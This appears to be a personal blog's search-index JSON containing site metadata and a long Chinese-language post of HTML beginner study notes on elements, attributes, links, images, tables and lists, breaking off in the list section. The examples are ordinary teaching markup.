{"meta":{"title":"MiaoTony's小窝","subtitle":"喵喵喵~","description":"喵~欢迎各位大佬的来访呀！","author":"MiaoTony","url":"https://miaotony.xyz","root":"/"},"pages":[{"title":"about","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","path":"about/index.html"},{"title":"categories","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","path":"categories/index.html"},{"title":"friends","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","path":"friends/index.html"},{"title":"contact","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","path":"contact/index.html"},{"title":"tags","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","path":"tags/index.html"}],"posts":[{"title":"FrontEnd | HTML 基础入门学习笔记","text":"前言最近想系统一点学一学前端，这一篇博客就简要记录一些前端中 HTML 基础入门的学习笔记吧。 看完了小甲鱼目前更新了的web开发入门的视频，讲的还是挺不错的，总体来说还算比较系统的，而且疑车有据23333。 不过感觉不够全面，于是再来刷了一遍 W3School。 后面忘了还可以再来看看，或者再查文档就完事了。😂 其实就是简单过一遍23333 类似于抄一遍（x 这篇文章超长长长长长长长长…… 所以先做好准备。 由于我的博客自带了一些CSS样式，显示的效果可能和预计的不同，最好还是建一个新的HTML文件来试试吧。 一些参考的网站W3School HTML 教程 速查宝典：HTML5 API速查（鱼C工作室） HTML 菜鸟教程 B站视频 （小甲鱼的视频居然还没更新完，催更一波 整体框架HTML5 &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"UTF-8\"> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"> &lt;title>Document&lt;/title> &lt;/head> &lt;body> &lt;/body> &lt;/html> 在VS Code中可以直接输入html:5，按下Tab键即可自动输入模板。用的是 Emmet Abbreviation。 下面主要参考 W3School 的教程。更详细的请参考官网。 元素HTML 文档是由 HTML 元素定义的。 元素指的是从开始标签（start tag） or开放标签（opening tag） 到结束标签（end tag） or闭合标签（closing tag） 的所有代码。 空元素在开始标签中进行关闭（以开始标签的结束而结束），如&lt;br /&gt;。虽然写成&lt;br&gt;也行，但建议都关闭。 HTML 标签对大小写不敏感：&lt;P&gt; 等同于&lt;p&gt;。但是推荐/强制使用小写字母。 属性属性为 HTML 元素提供附加信息。 属性总是以名称/值对的形式出现，比如：name=”value”。总是在 HTML 元素的开始标签中规定。 属性和属性值对大小写不敏感。但推荐使用小写。 属性值要包含在引号内，双引号、单引号均可。若属性值本身就含有双引号，那么必须使用单引号↓。 name='Bill \"HelloWorld\" Gates'常用的 HTML 属性： 属性 值 描述 class classname 规定元素的类名（classname） id id 规定元素的唯一 id style style_definition 规定元素的行内样式（inline style） title text 规定元素的额外信息（可在工具提示中显示） 头部 headhead元素中可以包含&lt;title&gt;、&lt;base&gt;、&lt;link&gt;、&lt;meta&gt;、&lt;script&gt; 以及 &lt;style&gt;。 title 元素&lt;title&gt; 标签定义文档的标题。 &lt;head> &lt;title>Title of the document&lt;/title> &lt;/head> base 元素&lt;base&gt; 标签为页面上的所有链接规定默认地址或默认目标（target）： &lt;head> &lt;base href=\"https://miaotony.xyz/\" /> &lt;base target=\"_blank\" /> &lt;/head> link 元素定义文档与外部资源之间的关系。如样式表等。 &lt;head> &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"mystyle.css\" /> &lt;/head> style 元素&lt;style&gt; 标签用于为 HTML 文档定义样式信息。 &lt;head> &lt;style type=\"text/css\"> body {background-color:yellow} p {color:blue} &lt;/style> &lt;/head> meta 元素元数据（metadata）是关于数据的信息。 &lt;meta&gt; 标签提供关于 HTML 文档的元数据。元数据不会显示在页面上，但是对于机器是可读的。 典型的情况是，meta 元素被用于规定页面的描述、关键词、文档的作者、最后修改时间以及其他元数据。 &lt;meta&gt; 标签始终位于 head 元素中。 元数据可用于浏览器（如何显示内容或重新加载页面），搜索引擎（关键词），或其他 web 服务。 指定 UTF-8 编码&lt;meta charset=\"utf-8\"> 网页尺寸自适应&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"> 一些SEO关键词优化关键词，描述，作者等。 &lt;meta name=\"keywords\" content=\"MiaoTony, HTML, test\" /> &lt;meta name=\"description\" content=\"MiaoTony's HTML test.\"/> &lt;meta name=\"author\" content=\"MiaoTony\" /> 自动刷新跳转页面 / 重定向页面&lt;meta http-equiv=\"refresh\" content=\"0; https://miaotony.xyz\" /> 0s后自动跳转。 标题标题（Heading）是通过 &lt;h1&gt; - &lt;h6&gt;定义，从大到小。 &lt;h1>This is heading 1&lt;/h1> &lt;h2>This is heading 2&lt;/h2> &lt;h3>This is heading 3&lt;/h3> &lt;h4>This is heading 4&lt;/h4> &lt;h5>This is heading 5&lt;/h5> &lt;h6>This is heading 6&lt;/h6> 请仅仅把标题标签用于标题文本。不要仅仅为了产生粗体文本而使用它们。请使用其它标签或 CSS 代替。 水平线&lt;hr /&gt;标签用于定义水平线。如↓。 段落 &lt;p&gt; 标签 浏览器会自动地在段落的前后添加空行。（&lt;p&gt; 是块级元素） 插入空行可以利用 &lt;br /&gt;，不要用 p 标签。 &lt;p>这是段落&lt;/p> 这是段落 在不产生一个新段落的情况下进行换行（新行），使用 &lt;br /&gt;，比如： &lt;p>This is&lt;br />a para&lt;br />graph with line breaks&lt;/p> This isa paragraph with line breaks --- 显示页面时，浏览器会移除源代码中多余的空格和空行。所有连续的空格或空行都会被算作一个空格。 需要注意的是，HTML 代码中的所有连续的空行（换行）也被显示为一个空格。比如： &lt;p> 春眠不觉晓， 处处闻啼鸟。 夜来风雨声， 花落知多少。 &lt;/p> 春眠不觉晓， 处处闻啼鸟。 夜来风雨声， 花落知多少。 注释&lt;!-- This is a comment --> 条件注释条件注释定义只有 Internet Explorer 执行的 HTML 标签。 &lt;!--[if lt IE 9]> &lt;script src=\"http://html5shiv.googlecode.com/svn/trunk/html5.js\">&lt;/script> &lt;![endif]--> 样式&lt;style&gt; 标签用于为 HTML 文档定义样式信息。 &lt;p style=\"font-family:verdana;color:red\"> This text is in Verdana and red&lt;/p> &lt;p style=\"font-family:times;color:green\"> This text is in Times and green&lt;/p> &lt;p style=\"font-size:30px\">This text is 30 pixels high&lt;/p> This text is in Verdana and red This text is in Times and green This text is 30 pixels high 下面是一些实例，更多关于样式的需要看 **CSS教程** 来着（（ 背景颜色bgcolor 属性已经弃用了，要用background-color。 &lt;p style=\"background-color:blue\">This is a paragraph.&lt;/p> This is a paragraph. 字体、颜色和尺寸style 属性淘汰了旧的 &lt;font&gt; 标签。 &lt;p style=\"font-family:arial;color:red;font-size:25px;\">A paragraph.&lt;/p> A paragraph. 文本对齐使用text-align属性 style 属性淘汰了旧的 align 属性。 &lt;p style=\"text-align:left\">靠左对齐&lt;/p> &lt;p style=\"text-align:center\">居中对齐&lt;/p> &lt;p style=\"text-align:right\">靠右对齐&lt;/p> 靠左对齐 居中对齐 靠右对齐 文本格式化定义很多供格式化输出的元素，比如粗体和斜体字。 格式化建议用strong、em这类基于内容的样式（content-based style）来代替b、i这类物理样式（physical style），更能语义化。 详见这里：HTML 教程延伸阅读：改变文本的外观和含义 &lt;b>This text is bold&lt;/b> &lt;strong>This text is strong&lt;/strong> &lt;big>This text is big&lt;/big> &lt;em>This text is emphasized&lt;/em> &lt;i>This text is italic&lt;/i> &lt;small>This text is small&lt;/small> This text contains &lt;sub>subscript下标&lt;/sub> This text contains &lt;sup>superscript上标&lt;/sup> This text is bold This text is strong This text is big This text is emphasized This text is italic This text is small This text containssubscript下标 This text containssuperscript上标 预格式文本&lt;pre&gt;标签 &lt;pre> 这是 预格式文本。 它保留了 空格 和换行。 &lt;/pre> &lt;pre> for i in range(1,10): print(i) &lt;/pre> 这是 预格式文本。 它保留了 空格 和换行。 pre 标签很适合显示计算机代码：（可以先用pre再用code标签 for i in range(1,10): print(i) 计算机/编程代码这些标签常用于显示计算机/编程代码↓。 &lt;code>Computer code&lt;/code> &lt;kbd>Keyboard input&lt;/kbd> &lt;tt>Teletype text&lt;/tt> &lt;samp>Sample text&lt;/samp> &lt;var>Computer variable&lt;/var> Computer code Keyboard input Teletype text Sample text Computer variable 地址address &lt;address> Written by &lt;a href=\"https://miaotony.xyz\">MiaoTony&lt;/a>.&lt;br /> Visit me at:&lt;br /> miaotony.xyz&lt;br /> MeowBox &lt;/address> Written by MiaoTony. Visit me at: miaotony.xyz MeowBox 缩写和首字母缩写在某些浏览器中，当把鼠标移至缩略词语上时，title 可用于展示表达的完整版本。 &lt;abbr&gt;定义缩写，&lt;acronym&gt; 定义首字母缩写。 &lt;abbr title=\"etcetera\">etc.&lt;/abbr> &lt;acronym title=\"World Wide Web\">WWW&lt;/acronym> etc.WWW 文字方向（双向重写）若浏览器支持双流向覆盖 bi-directional override (bdo)，&lt;bdo&gt;元素用于覆盖当前文本方向，则下面这一行会从右向左输出 (rtl)。 &lt;bdo dir=\"rtl\"> Here is some Hebrew text &lt;/bdo> Here is some Hebrew text 引用使用 blockquote 元素的话，浏览器会插入换行和外边距，而 q 元素不会有任何特殊的呈现（只是加一个引号）。 这是长的引用： &lt;blockquote> 这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。 &lt;/blockquote> 这是短的引用： &lt;q>这是短的引用。&lt;/q> 这是长的引用： 这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。 这是短的引用：这是短的引用。 删除线 &amp; 插入线大多数浏览器会改写为删除文本和下划线文本。 一些老式的浏览器会把删除文本和下划线文本显示为普通文本。 &lt;p>一打有 &lt;del>二十&lt;/del> &lt;ins>十二&lt;/ins> 件。&lt;/p> 一打有 二十 十二 件。 定义 HTML5 标准： 如果设置了 &lt;dfn&gt; 元素的 title 属性，则定义项目： &lt;p>The &lt;dfn title=\"World Health Organization\">WHO&lt;/dfn> was founded in 1948.&lt;/p> The WHO was founded in 1948. 如果 &lt;dfn&gt; 元素包含具有标题的 &lt;abbr&gt; 元素，则 title 定义项目： &lt;p>The &lt;dfn>&lt;abbr title=\"World Health Organization\">WHO&lt;/abbr>&lt;/dfn> was founded in 1948. &lt;/p> The WHO was founded in 1948. 否则，&lt;dfn&gt; 文本内容即是项目，并且父元素包含定义。 &lt;p>&lt;dfn>WHO&lt;/dfn> World Health Organization 成立于 1948 年。&lt;/p> WHO World Health Organization 成立于 1948 年。 若希望简而化之，请使用第一条，或使用 &lt;abbr&gt; 代替。 著作标题浏览器通常以斜体来显示。 &lt;p>&lt;cite>The Scream&lt;/cite> by Edward Munch. Painted in 1893.&lt;/p> The Scream by Edward Munch. Painted in 1893. 计算机代码&lt;code&gt; 元素不保留多余的空格和折行。 &lt;code> var person = { firstName:\"Bill\", lastName:\"Gates\", age:50, eyeColor:\"blue\" } &lt;/code> var person = { firstName:\"Bill\", lastName:\"Gates\", age:50, eyeColor:\"blue\" } 需解决该问题，必须在 &lt;pre&gt; 元素中包围代码 &lt;code> &lt;pre> var person = { firstName:\"Bill\", lastName:\"Gates\", age:50, eyeColor:\"blue\" } &lt;/pre> &lt;/code> var person = { firstName:\"Bill\", lastName:\"Gates\", age:50, eyeColor:\"blue\" } 也可以code和pre反过来。 CSS 样式的引用外部样式表&lt;head> &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"mystyle.css\"> &lt;/head> 内部样式表&lt;head> &lt;style type=\"text/css\"> body {background-color: red} p {margin-left: 20px} &lt;/style> &lt;/head> 内联样式&lt;p style=\"color: red; margin-left: 20px\"> This is a paragraph &lt;/p> 优先级是 内联样式&gt;内部样式表&gt;外部样式表。 链接&lt;a href=\"https://miaotony.xyz\">MiaoTony's blog&lt;/a> MiaoTony’s blog “链接文本” 不必一定是文本。图片或其他 HTML 元素都可以成为链接。 这是另一个 mailto 链接： &lt;p>&lt;a href=\"mailto:someone@microsoft.com?cc=someoneelse@microsoft.com&amp;bcc=andsomeoneelse2@microsoft.com&amp;subject=Summer%20Party&amp;body=You%20are%20invited%20to%20a%20big%20summer%20party!\">发送邮件！&lt;/a> &lt;/p> 发送邮件！ target 属性Target 属性可以定义被链接的文档在何处显示。 在新窗口打开： &lt;a href=\"https://miaotony.xyz\" target=\"_blank\">MiaoTony's blog&lt;/a> MiaoTony’s blog 跳出页面框架： &lt;a href=\"https://miaotony.xyz\" target=\"_top\">MiaoTony's blog&lt;/a> MiaoTony’s blog （在hexo部署的时候，好像把所有的target都改成 “_blank” 了 emmm name 属性name属性规定锚（anchor）的名称。可以使用 name 属性创建 HTML 页面中的书签。 当使用命名锚（named anchors）时，我们可以创建直接跳至该命名锚（比如页面中某个小节）的链接。 首先对锚进行命名，或者说创建一个书签—— &lt;a name=\"label123\">锚（显示在页面上的文本）&lt;/a> 锚（显示在页面上的文本） 也可以使用 id 属性来替代 name 属性。 然后在同一个文档中创建指向该锚的链接，或在其他页面指向该锚，即可跳转到这个锚点的位置。 将 # 符号和锚名称添加到 URL 的末端，就可以直接链接到 tips 这个命名锚了。 &lt;a href=\"#tips\" target=\"_self\">跳转到上面的锚点&lt;/a> 跳转到上面的锚点 假如浏览器找不到已定义的命名锚，那么就会定位到文档的顶端。不会有错误发生。 图像空标签，只包含属性，并且没有闭合标签。 &lt;img src=\"url\" /> 替代文本 alt 属性在浏览器无法载入图像时（图裂了），替换文本属性将被用来显示失去的信息。 &lt;img src=\"cat.gif\" alt=\"A cat\"> 就像这样： 图像背景&lt;body background=\"/background.jpg\"> 如果图像小于页面，图像会进行重复。 图像对齐&lt;h2>未设置对齐方式的图像：&lt;/h2> &lt;p>图像 &lt;img src =\"pic.jpg\"> 在文本中&lt;/p> &lt;h2>已设置对齐方式的图像：&lt;/h2> &lt;p>图像 &lt;img src=\"pic.jpg\" align=\"bottom\"> 在文本中&lt;/p> &lt;p>图像 &lt;img src =\"pic.jpg\" align=\"middle\"> 在文本中&lt;/p> &lt;p>图像 &lt;img src =\"pic.jpg\" align=\"top\"> 在文本中&lt;/p> bottom 对齐方式是默认的对齐方式。 浮动图像&lt;p> &lt;img src =\"/i/eg_cute.gif\" align =\"left\"> 带有图像的一个段落。图像的 align 属性设置为 \"left\"。图像将浮动到文本的左侧。 &lt;/p> &lt;p> &lt;img src =\"/i/eg_cute.gif\" align =\"right\"> 带有图像的一个段落。图像的 align 属性设置为 \"right\"。图像将浮动到文本的右侧。 &lt;/p> 图像尺寸通过改变 img 标签的 “height” 和 “width” 属性的值，可以放大或缩小图像。 &lt;img src=\"/html5.jpg\" width=\"50\" height=\"50\"> &lt;img src=\"/html5.jpg\" width=\"100\" height=\"100\"> &lt;img src=\"/html5.jpg\" width=\"200\" height=\"200\"> 图像链接将一个图像当作链接使用。 &lt;a href=\"https://miaotony.xyz\">&lt;img src=\"/html5.jpg\" />&lt;/a> 比如点一点这个就到达我的博客主页了→ （有可能被hexo优化掉emmm 创建图像映射创建带有可供点击区域的图像地图。其中的每个区域都是一个超级链接。 img 元素中的 “usemap” 属性引用 map 元素中的 “id” 或 “name” 属性（根据浏览器） 图片左上角坐标为 (0,0)，右下角为 (x,y)，左往右为x轴正方向，上往下为y轴正方向。 &lt;img src=\"https://www.w3school.com.cn/i/eg_planets.jpg\" border=\"0\" usemap=\"#planetmap\" alt=\"Planets\" /> &lt;map name=\"planetmap\" id=\"planetmap\"> &lt;area shape=\"circle\" coords=\"180,139,14\" href =\"https://www.w3school.com.cn/example/html/venus.html\" target =\"_blank\" alt=\"Venus\" /> &lt;area shape=\"circle\" coords=\"129,161,10\" href =\"https://www.w3school.com.cn/example/html/mercur.html\" target =\"_blank\" alt=\"Mercury\" /> &lt;area shape=\"rect\" coords=\"0,0,110,260\" href =\"https://www.w3school.com.cn/example/html/sun.html\" target =\"_blank\" alt=\"Sun\" /> &lt;/map> 其中&lt;map&gt;用来定义图像地图，&lt;area&gt;用来定义图像地图中的可点击区域。 点击对应的区域会跳转到不同的页面。（链接有可能被hexo优化掉emmm还是可以点的 将图像转换为图像映射把一幅普通的图像设置为图像映射。加入ismap 属性，即可获得图片的坐标。 &lt;a href=\"/html_ismap.html\"> &lt;img src=\"/planets.jpg\" ismap /> &lt;/a> 如果点击 (12,34)，则会访问/html_ismap.html?12,34. 表格每个表格由 table 标签开始。每个表格行由 tr 标签 (table row) 开始。每个表格数据由 td 标签 (table data) 开始，即数据单元格的内容。 数据单元格可以包含文本、图片、列表、段落、表单、水平线、表格等等。 （这里在博客上可能很多显示不正常，因为另外有CSS样式对全局表格进行了定义 &lt;table> &lt;tr> &lt;td>row 1, cell 1&lt;/td> &lt;td>row 1, cell 2&lt;/td> &lt;/tr> &lt;tr> &lt;td>row 2, cell 1&lt;/td> &lt;td>row 2, cell 2&lt;/td> &lt;/tr> &lt;/table> row 1, cell 1 row 1, cell 2 row 2, cell 1 row 2, cell 2 边框border属性 上面的例子没有边框，或者设置&lt;table border=\"0\"&gt;。 带有普通的边框： &lt;table border=\"1\"> &lt;tr> &lt;td>First&lt;/td> &lt;td>Row&lt;/td> &lt;/tr> &lt;tr> &lt;td>Second&lt;/td> &lt;td>Row&lt;/td> &lt;/tr> &lt;/table> First Row Second Row 粗的边框（增大border）： &lt;table border=\"10\"> First Row Second Row 表头th标签 大多数浏览器会把表头显示为粗体居中的文本 &lt;table border=\"1\"> &lt;tr> &lt;th>Heading&lt;/th> &lt;th>Another Heading&lt;/th> &lt;/tr> &lt;tr> &lt;td>row 1, cell 1&lt;/td> &lt;td>row 1, cell 2&lt;/td> &lt;/tr> &lt;tr> &lt;td>row 2, cell 1&lt;/td> &lt;td>row 2, cell 2&lt;/td> &lt;/tr> &lt;/table> Heading Another Heading row 1, cell 1 row 1, cell 2 row 2, cell 1 row 2, cell 2 下面是垂直的表头： &lt;table border=\"1\"> &lt;tr> &lt;th>姓名&lt;/th> &lt;td>Miao&lt;/td> &lt;/tr> &lt;tr> &lt;th>电话&lt;/th> &lt;td>123456&lt;/td> &lt;/tr> &lt;tr> &lt;th>电话&lt;/th> &lt;td>654321&lt;/td> &lt;/tr> &lt;/table> 姓名 Miao 电话 123456 电话 654321 空单元格&lt;table border=\"1\"> &lt;tr> &lt;td>row 1, cell 1&lt;/td> &lt;td>row 1, cell 2&lt;/td> &lt;/tr> &lt;tr> &lt;td>&lt;/td> &lt;td>row 2, cell 2&lt;/td> &lt;/tr> &lt;/table> row 1, cell 1 row 1, cell 2 row 2, cell 2 这个空的单元格的边框可能没有被显示出来。为了避免这种情况，在空单元格中添加一个空格占位符（&amp;nbsp;)，就可以将边框显示出来。 &lt;table border=\"1\"> &lt;tr> &lt;td>row 1, cell 1&lt;/td> &lt;td>row 1, cell 2&lt;/td> &lt;/tr> &lt;tr> &lt;td>&amp;nbsp;&lt;/td> &lt;td>row 2, cell 2&lt;/td> &lt;/tr> &lt;/table> row 1, cell 1 row 1, cell 2 &nbsp; row 2, cell 2 表的标题caption标签 &lt;table border=\"6\"> &lt;caption>这是标题&lt;/caption> &lt;tr> &lt;td>100&lt;/td> &lt;td>200&lt;/td> &lt;td>300&lt;/td> &lt;/tr> &lt;tr> &lt;td>400&lt;/td> &lt;td>500&lt;/td> &lt;td>600&lt;/td> &lt;/tr> &lt;/table> 这是标题 100 200 300 400 500 600 单元格跨行跨列横跨列：colspan属性 &lt;table border=\"1\"> &lt;tr> &lt;th>姓名&lt;/th> &lt;th colspan=\"2\">电话&lt;/th> &lt;/tr> &lt;tr> &lt;td>Miao&lt;/td> &lt;td>123456&lt;/td> &lt;td>654321&lt;/td> &lt;/tr> &lt;/table> 姓名 电话 Miao 123456 654321 横跨行：rowspan属性 &lt;table border=\"1\"> &lt;tr> &lt;th>姓名&lt;/th> &lt;td>Miao&lt;/td> &lt;/tr> &lt;tr> &lt;th rowspan=\"2\">电话&lt;/th> &lt;td>123456&lt;/td> &lt;/tr> &lt;tr> &lt;td>654321&lt;/td> &lt;/tr> &lt;/table> 姓名 Miao 电话 123456 654321 表格内标签&lt;table border=\"1\"> &lt;tr> &lt;td> &lt;p>这是一个段落。&lt;/p> &lt;p>这是另一个段落。&lt;/p> &lt;/td> &lt;td>这个单元包含一个表格： &lt;table border=\"1\"> &lt;tr> &lt;td>A&lt;/td> &lt;td>B&lt;/td> &lt;/tr> &lt;tr> &lt;td>C&lt;/td> &lt;td>D&lt;/td> &lt;/tr> &lt;/table> &lt;/td> &lt;/tr> &lt;tr> &lt;td>这个单元包含一个列表： &lt;ul> &lt;li>苹果&lt;/li> &lt;li>香蕉&lt;/li> &lt;li>菠萝&lt;/li> &lt;/ul> &lt;/td> &lt;td>一张图片： &lt;img src=\"FrontEnd_HTML_Basic/html5.jpg\" alt=\"HTML5\" /> &lt;/td> &lt;/tr> &lt;/table> 这是一个段落。 这是另一个段落。 这个单元包含一个表格： A B C D 这个单元包含一个列表： 苹果 香蕉 菠萝 一张图片： 单元格边距Cellpadding 单元格内容与其边框之间的空白。 &lt;table border=\"1\" cellpadding=\"20\"> &lt;tr> &lt;td>First&lt;/td> &lt;td>Row&lt;/td> &lt;/tr> &lt;tr> &lt;td>Second&lt;/td> &lt;td>Row&lt;/td> &lt;/tr> &lt;/table> First Row Second Row 单元格间距cellspacing 增加单元格之间的距离。 &lt;table border=\"1\" cellspacing=\"20\"> &lt;tr> &lt;td>First&lt;/td> &lt;td>Row&lt;/td> &lt;/tr> &lt;tr> &lt;td>Second&lt;/td> &lt;td>Row&lt;/td> &lt;/tr> &lt;/table> First Row Second Row 表格/单元格背景背景颜色bgcolor属性 &lt;table border=\"1\" bgcolor=\"yellow\"> &lt;tr> &lt;td>First&lt;/td> &lt;td>Row&lt;/td> &lt;/tr> &lt;tr> &lt;td>Second&lt;/td> &lt;td>Row&lt;/td> &lt;/tr> &lt;/table> First Row Second Row 背景图像background属性 &lt;table border=\"1\" background=\"FrontEnd_HTML_Basic/html5.jpg\"> &lt;tr> &lt;td>First&lt;/td> &lt;td>Row&lt;/td> &lt;/tr> &lt;tr> &lt;td>Second&lt;/td> &lt;td>Row&lt;/td> &lt;/tr> &lt;/table> First Row Second Row 单元格背景同理，加在相应的td标签里即可。例如： &lt;table border=\"1\"> &lt;tr> &lt;td bgcolor=\"blue\">First&lt;/td> &lt;td>Row&lt;/td> &lt;/tr> &lt;/table> First Row 排列内容align属性 &lt;table width=\"400\" border=\"1\"> &lt;tr> &lt;th align=\"center\">消费项目....&lt;/th> &lt;th align=\"center\">一月&lt;/th> &lt;th align=\"center\">二月&lt;/th> &lt;/tr> &lt;tr> &lt;td align=\"left\">衣服&lt;/td> &lt;td align=\"right\">$241.10&lt;/td> &lt;td align=\"right\">$50.20&lt;/td> &lt;/tr> &lt;tr> &lt;td align=\"left\">食物&lt;/td> &lt;td align=\"right\">$730.40&lt;/td> &lt;td align=\"right\">$650.00&lt;/td> &lt;/tr> &lt;tr> &lt;th align=\"left\">总计&lt;/th> &lt;th align=\"right\">$1001.50&lt;/th> &lt;th align=\"right\">$744.65&lt;/th> &lt;/tr> &lt;/table> 消费项目.... 一月 二月 衣服 $241.10 $50.20 食物 $730.40 $650.00 总计 $1001.50 $744.65 框架frame属性 &lt;p>Table with frame=\"box\":&lt;/p> &lt;table frame=\"box\"> &lt;tr> &lt;th>Month&lt;/th> &lt;th>Savings&lt;/th> &lt;/tr> &lt;tr> &lt;td>January&lt;/td> &lt;td>$100&lt;/td> &lt;/tr> &lt;/table> &lt;p>Table with frame=\"above\":&lt;/p> &lt;table frame=\"above\"> &lt;tr> &lt;th>Month&lt;/th> &lt;th>Savings&lt;/th> &lt;/tr> &lt;tr> &lt;td>January&lt;/td> &lt;td>$100&lt;/td> &lt;/tr> &lt;/table> &lt;p>Table with frame=\"below\":&lt;/p> &lt;table frame=\"below\"> &lt;tr> &lt;th>Month&lt;/th> &lt;th>Savings&lt;/th> &lt;/tr> &lt;tr> &lt;td>January&lt;/td> &lt;td>$100&lt;/td> &lt;/tr> &lt;/table> &lt;p>Table with frame=\"hsides\":&lt;/p> &lt;table frame=\"hsides\"> &lt;tr> &lt;th>Month&lt;/th> &lt;th>Savings&lt;/th> &lt;/tr> &lt;tr> &lt;td>January&lt;/td> &lt;td>$100&lt;/td> &lt;/tr> &lt;/table> &lt;p>Table with frame=\"vsides\":&lt;/p> &lt;table frame=\"vsides\"> &lt;tr> &lt;th>Month&lt;/th> &lt;th>Savings&lt;/th> &lt;/tr> &lt;tr> &lt;td>January&lt;/td> &lt;td>$100&lt;/td> &lt;/tr> &lt;/table> Table with frame=\"box\": Month Savings January $100 Table with frame=\"above\": Month Savings January $100 Table with frame=\"below\": Month Savings January $100 Table with frame=\"hsides\": Month Savings January $100 Table with frame=\"vsides\": Month Savings January $100 行分组thead 元素应该与 tbody 和 tfoot 元素结合起来使用。（但很少使用这三个元素） tbody 元素用于对 HTML 表格中的主体内容进行分组，而 tfoot 元素用于对 HTML 表格中的表注（页脚）内容进行分组。 thead、tfoot 以及 tbody 元素使您有能力对表格中的行进行分组。当您创建某个表格时，您也许希望拥有一个标题行，一些带有数据的行，以及位于底部的一个总计行。这种划分使浏览器有能力支持独立于表格标题和页脚的表格正文滚动。当长的表格被打印时，表格的表头和页脚可被打印在包含表格数据的每张页面上。 &lt;thead&gt; 内部必须拥有&lt;tr&gt; 标签！ &lt;table border=\"1\"> &lt;thead style=\"color:green\"> &lt;tr> &lt;th>Month&lt;/th> &lt;th>Savings&lt;/th> &lt;/tr> &lt;/thead> &lt;tbody style=\"color:blue;height:50px\"> &lt;tr> &lt;td>January&lt;/td> &lt;td>$100&lt;/td> &lt;/tr> &lt;tr> &lt;td>February&lt;/td> &lt;td>$80&lt;/td> &lt;/tr> &lt;/tbody> &lt;tfoot style=\"color:red\"> &lt;tr> &lt;td>Sum&lt;/td> &lt;td>$180&lt;/td> &lt;/tr> &lt;/tfoot> &lt;/table> Month Savings January $100 February $80 Sum $180 列分组col标签为表格中一个或多个列定义属性值。 col 元素是仅包含属性的空元素。如需创建列，您就必须在 tr 元素内部规定 td 元素。 例如为表格中的三个列规定了不同的对齐方式： &lt;table width=\"100%\" border=\"1\"> &lt;col align=\"left\" /> &lt;col align=\"left\" /> &lt;col align=\"right\" /> &lt;tr> &lt;th>ISBN&lt;/th> &lt;th>Title&lt;/th> &lt;th>Price&lt;/th> &lt;/tr> &lt;tr> &lt;td>3476896&lt;/td> &lt;td>My first HTML&lt;/td> &lt;td>$53&lt;/td> &lt;/tr> &lt;/table> ISBN Title Price 3476896 My first HTML $53 （然而我用Firefox、Chrome、Edge都没有效果emmmm。 colgroup 标签用于对表格中的列进行组合，以便对其进行格式化。 如需对全部列应用样式，&lt;colgroup&gt;标签很有用，这样就不需要对各个单元和各行重复应用样式了。 &lt;colgroup&gt; 标签只能在 table 元素中使用。 例如两个 colgroup 元素为表格中的三列规定了不同的对齐方式和样式（注意第一个 colgroup 元素横跨两列）： &lt;table width=\"100%\" border=\"1\"> &lt;colgroup span=\"2\" align=\"left\">&lt;/colgroup> &lt;colgroup align=\"right\" style=\"color:#0000FF;\">&lt;/colgroup> &lt;tr> &lt;th>ISBN&lt;/th> &lt;th>Title&lt;/th> &lt;th>Price&lt;/th> &lt;/tr> &lt;tr> &lt;td>3476896&lt;/td> &lt;td>My first HTML&lt;/td> &lt;td>$53&lt;/td> &lt;/tr> &lt;/table> ISBN Title Price 3476896 My first HTML $53 （然而我这里还是没有效果emmm 列表无序列表Unordered list （这里的样式也被全局的样式给冲掉了 emmm 项目列表，项目默认使用粗体圆点（典型的小黑圆圈）进行标记。 &lt;ul> &lt;li>First item&lt;/li> &lt;li>Next item&lt;/li> &lt;/ul> First item Next item 可以定义不同的样式类型。 disc 类型&lt;ul type=\"disc\"> &lt;li>苹果&lt;/li> &lt;li>香蕉&lt;/li> &lt;li>柠檬&lt;/li> &lt;li>桔子&lt;/li> &lt;/ul> 苹果 香蕉 柠檬 桔子 circle 类型&lt;ul type=\"circle\"> &lt;li>苹果&lt;/li> &lt;li>香蕉&lt;/li> &lt;li>柠檬&lt;/li> &lt;li>桔子&lt;/li> &lt;/ul> 苹果 香蕉 柠檬 桔子 square 类型&lt;ul type=\"square\"> &lt;li>苹果&lt;/li> &lt;li>香蕉&lt;/li> &lt;li>柠檬&lt;/li> &lt;li>桔子&lt;/li> &lt;/ul> 苹果 香蕉 柠檬 